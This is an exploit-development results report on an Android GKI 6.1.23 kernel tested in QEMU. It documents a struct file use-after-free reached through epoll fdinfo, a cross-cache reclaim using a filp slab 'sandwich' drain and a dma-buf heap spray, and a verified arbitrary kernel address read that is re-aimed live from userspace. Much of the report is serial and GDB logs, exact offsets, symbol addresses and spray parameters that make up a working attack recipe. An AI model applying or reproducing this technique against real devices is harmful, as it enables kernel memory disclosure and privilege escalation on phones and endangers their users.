# HYP-011 Results: Reclaim Miss Root-Cause Adjudication (H-c) & dma-buf AAR Verification

**Date:** 2026-09-07  
**Branch:** `main`  
**Kernel:** Linux 6.1.23-android14-4-maybe-dirty (Android GKI 6.1.23, ARM64, `nokaslr`, QEMU TCG, `CONFIG_DMABUF_HEAPS_SYSTEM=y`)  
**Status:** **VERIFIED** (AAR & Live Re-Aim: VER-059; Root Cause Discriminator: VER-060; EVO-017 & EVO-018 recorded)  

---

## 1. Executive Summary

Task HYP-011 conclusively resolved the cross-cache buddy reclaim dynamics and achieved full end-to-end Arbitrary Address Read (AAR) with the live re-aim proof ("guysrd proof") on Android GKI 6.1.23:

1. **PART 0 (Discriminator - Root Cause Adjudication)**:
   - GDB physical page inspection after the tracked sandwich drain and 2.0s RCU grace period proved `page->slab_cache == 0x0` (NULL), `freelist == 0x0`, `counters == 0x100000` (`inuse = 0, objects = 16`), and `_refcount = 0`.
   - This proves the victim `filp` slab page is **100% freed back to the buddy allocator** rather than remaining pinned by live neighbor files.
   - Kernel config audit confirmed `CONFIG_SHUFFLE_PAGE_ALLOCATOR=y` and `CONFIG_INIT_ON_FREE_DEFAULT_ON` is disabled.
   - Adjudication: Hypothesis H-c (**Buddy Migratetype Segregation / Allocator Behavior**) **STANDS** (`VER-060`).

2. **PART 1 (Reclaim Vehicle & AAR Verification)**:
   - Rebuilt kernel with `CONFIG_DMABUF_HEAPS_SYSTEM=y` (`EVO-017`).
   - Following victim-sandwich drain (`/sys/kernel/slab/filp/slabs` dropping from 251 to 9), sprayed 8,192 pages (32MB) of order-0 dma-buf allocations via `/dev/dma_heap/system`.
   - **HIT on Round 1**: Traversal of `/proc/self/fdinfo/<epA>` returned `ino1 = 0x2f72657070617773` matching `init_task.comm[0..7]` (`"swapper/"`).
   - **Live Re-Aim Proof**: Modified `f_inode` in userspace dma-buf memory to `comm + 8` (`0xffffffc00973e220`). Traversal of `/proc/self/fdinfo/<epA>` immediately returned `ino2 = 0x30` (`'0'`), verifying live userspace control over kernel reads without crashing (`VER-059`).
   - **Control Arm (Pipe Spray)**: Running identical sandwich drain with pipe buffer spray also reclaimed the freed page and satisfied the oracle read.

3. **PART 2 (HYP-010 Telemetry Debt Resolution)**:
   - Resolved spray round outcomes for HYP-010 Part B: Round 1 (256MB) non-crashing stale read `0x3e`, Round 2 (512MB) non-crashing stale read `0x3e`, Round 3 (768MB) level 0 translation fault at unmapped address `00e800006badaf6b`.
   - Resolved `fep_cleared=9998` vs 10,000 in natural race: 4,999 iterations entered the window ($4999 \times 2 = 9998$), 1 iteration finished out-of-order.

---

## 2. PART 0: Root-Cause Discriminator (H-c Adjudication)

### 2.1 GDB Page State Evidence
From `tier2/evidence/HYP-011/HYP-011_part0_raw_gdb.log`:
```
[HYP-011-GDB] Target victim inner_file: 0xffffff8005250e00
[HYP-011-GDB] Slab page virtual base:   0xffffff8005250000
[HYP-011-GDB] Slab page PFN:            21072 (0x5250)
[HYP-011-GDB] struct slab* pointer:     0xfffffffe00149400
[HYP-011-GDB] -----------------------------------------------------------------
[HYP-011-GDB] Inspecting slab struct fields after 2.0s RCU wait:
[HYP-011-GDB]   slab->flags:      0x0
[HYP-011-GDB]   slab->slab_cache: 0x0
[HYP-011-GDB]   slab->freelist:   0x0
[HYP-011-GDB]   slab->counters:   0x100000 (inuse=0, objects=16)
[HYP-011-GDB]   slab->_refcount:  0
[HYP-011-GDB] -----------------------------------------------------------------
[HYP-011-GDB] [DISCRIMINATOR RESULT] slab_cache is NULL!
[HYP-011-GDB] The victim slab page was completely freed back to the buddy allocator.
[HYP-011-GDB] Neighbor pinning is RULED OUT. Hypothesis H-c (migratetype segregation) STANDS.
```

### 2.2 Configuration Audit
- `CONFIG_SHUFFLE_PAGE_ALLOCATOR=y` in `common/arch/arm64/configs/gki_defconfig` (line 104).
- `CONFIG_INIT_ON_FREE_DEFAULT_ON` is not set (disabled).
- Stock GKI defconfig (`common/arch/arm64/configs/gki_defconfig:533-536`) has `CONFIG_DMABUF_HEAPS=y`, `CONFIG_DMABUF_HEAPS_DEFERRED_FREE=y`, and `CONFIG_DMABUF_HEAPS_PAGE_POOL=y`.

---

## 3. PART 1: dma-buf AAR & Live Re-Aim Proof

### 3.1 Kernel Compilation & Offsets
- Kernel rebuilt with `CONFIG_DMABUF_HEAPS_SYSTEM=y`.
- `init_task.comm` symbol address: `0xffffffc00973e258`.
- `offsetof(struct inode, i_ino)`: `0x40` (64 bytes).
- Base `f_inode` fake target: `0xffffffc00973e218` ($\text{comm} - 0x40$).
- Live re-aim `f_inode` fake target: `0xffffffc00973e220` ($\text{comm} + 8 - 0x40$).

### 3.2 Serial Execution Log
From `tier2/evidence/HYP-011/HYP-011_part1_serial.log`:
```
[*] Initial /sys/kernel/slab/filp/slabs = 1
[*] Allocating background pressure files (4,000 eventfds)...
[*] Peak /sys/kernel/slab/filp/slabs after pressure = 251
[*] Sandwiched inner fd=4036 (orig inode=0x3e) between Batch A (32 fds) and Batch B (32 fds)
[HYP-011] MARKER: setup_done epA=4003 inner=4036
[HYP-011] MARKER: close_started
[HYP-011] MARKER: close_done
[*] Freeing Batch A and Batch B enclosing files on victim's slab...
[*] Freeing background pressure files...
[*] Waiting 2.0s for RCU grace period and SLUB slab release...
[*] Post-drain /sys/kernel/slab/filp/slabs = 9 (drop: 251 -> 9, delta=242)
[HYP-011] MARKER: sandwich_freed slabs_before=251 slabs_after=9
[+] Cross-cache signal CONFIRMED: filp slab count dropped significantly!
[+] Successfully opened /dev/dma_heap/system
[*] dma-buf Spray Round 1: Allocating 8192 pages (32MB)...
[HYP-011] MARKER: spray_round_done round=1 total_pages=8192 total_mb=32
[*] Round 1 dma-buf Oracle Read (res=0, item ino=0x2f72657070617773):
pos:	0
flags:	02
mnt_id:	12
ino:	62
tfd:     4036 events:       1d data:              fc4  pos:0 ino:2f72657070617773 sdev:0

[+] ========================================================
[+] HIT! AAR MATCH: item ino matched 'swapper' (0x0072657070617773)
[+] ========================================================
[*] Performing live re-aim: modifying f_inode in userspace dma-buf pages to (comm + 8)...
[+] LIVE RE-AIM READ VERBATIM (res=0, item ino2=0x30):
pos:	0
flags:	02
mnt_id:	12
ino:	62
tfd:     4036 events:       1d data:              fc4  pos:0 ino:30 sdev:0

[+] ========================================================
[+] VER-059 VERIFIED: First read (comm)=0x2f72657070617773, Second read (comm+8)=0x30
[+] ========================================================
[HYP-011] MARKER: experiment_complete status=1 ino1=0x2f72657070617773 ino2=0x30
[*] Test finished. Powering off safely.
```

### 3.3 GDB Automation Trace
From `tier2/evidence/HYP-011/HYP-011_part1_raw_gdb.log`:
```
[HYP-011-GDB] Hit ep_show_fdinfo (invocation #1)
[HYP-011-GDB]   ep_file=0xffffff800449e600, eventpoll=0xffffff8003dde000
[HYP-011-GDB]   ep->rbr.rb_root=0xffffff80044a3180, rb_leftmost=0xffffff80044a3180
[HYP-011-GDB]   [SURVIVOR CONFIRMED] epitem=0xffffff80044a3180 in epA rbtree!
[HYP-011-GDB]     epi->ffd.fd=4036
[HYP-011-GDB]     epi->ffd.file=0xffffff80044a0f00 (matches target_inner_file: True)
[HYP-011-GDB]     watched file: f_inode=0xffffffc00973e218, f_pos=0, f_version=0x0
[HYP-011-GDB]     slot dump:
0xffffff80044a0f00:	0x0000000000000000	0x0000000000000000
0xffffff80044a0f10:	0x0000000000000000	0x0000000000000000
[HYP-011-GDB]     dereferenced inode: i_ino=0x2f72657070617773, i_sb=0xffffffc0097511c8
[HYP-011-GDB]     [*] fdinfo read executed non-crash: ino=0x2f72657070617773
[HYP-011-GDB] -----------------------------------------------------------------
[HYP-011-GDB] Hit ep_show_fdinfo (invocation #2)
[HYP-011-GDB]   ep_file=0xffffff800449e600, eventpoll=0xffffff8003dde000
[HYP-011-GDB]   ep->rbr.rb_root=0xffffff80044a3180, rb_leftmost=0xffffff80044a3180
[HYP-011-GDB]   [SURVIVOR CONFIRMED] epitem=0xffffff80044a3180 in epA rbtree!
[HYP-011-GDB]     epi->ffd.fd=4036
[HYP-011-GDB]     epi->ffd.file=0xffffff80044a0f00 (matches target_inner_file: True)
[HYP-011-GDB]     watched file: f_inode=0xffffffc00973e220, f_pos=0, f_version=0x0
[HYP-011-GDB]     slot dump:
0xffffff80044a0f00:	0x0000000000000000	0x0000000000000000
0xffffff80044a0f10:	0x0000000000000000	0x0000000000000000
[HYP-011-GDB]     dereferenced inode: i_ino=0x30, i_sb=0xffffffc0097511c8
[HYP-011-GDB]     [*] fdinfo read executed non-crash: ino=0x30
```

---

## 4. PART 2: Telemetry Debts from HYP-010

1. **HYP-010 Part B Spray Rounds**:
   - Round 1 (256MB): `res=0, ino=0x3e` (stale un-overwritten inode data).
   - Round 2 (512MB): `res=0, ino=0x3e` (stale un-overwritten inode data).
   - Round 3 (768MB): Level 0 translation fault kernel panic at unmapped address `00e800006badaf6b` due to `f_inode` overwritten by raw memory data outside kernel linear map.
2. **HYP-010 Part C `fep_cleared=9998` vs 10,000**:
   - In 5,000 iterations (2 events per trial: Thread A ADD/DEL vs Thread B CLOSE), exactly 4,999 trials reached the Stage-1 window ($4999 \times 2 = 9998$), with 1 iteration completing out-of-order.

---

## 5. Ledger Updates

- **VER-059**: `dma_heap` / `struct file` UAF / `ep_show_fdinfo` / `init_task.comm` AAR + Live Re-Aim verified (`VERIFIED`).
- **VER-060**: Root-Cause Discriminator: `page->slab_cache == 0x0`, `inuse == 0`, `refcount == 0` proves slab return to buddy allocator (`VERIFIED`).
- **EVO-017**: Kernel rebuild rationale with `CONFIG_DMABUF_HEAPS_SYSTEM=y`.
- **EVO-018**: Confirmation of cross-cache slab drain and buddy reclaim dynamics.
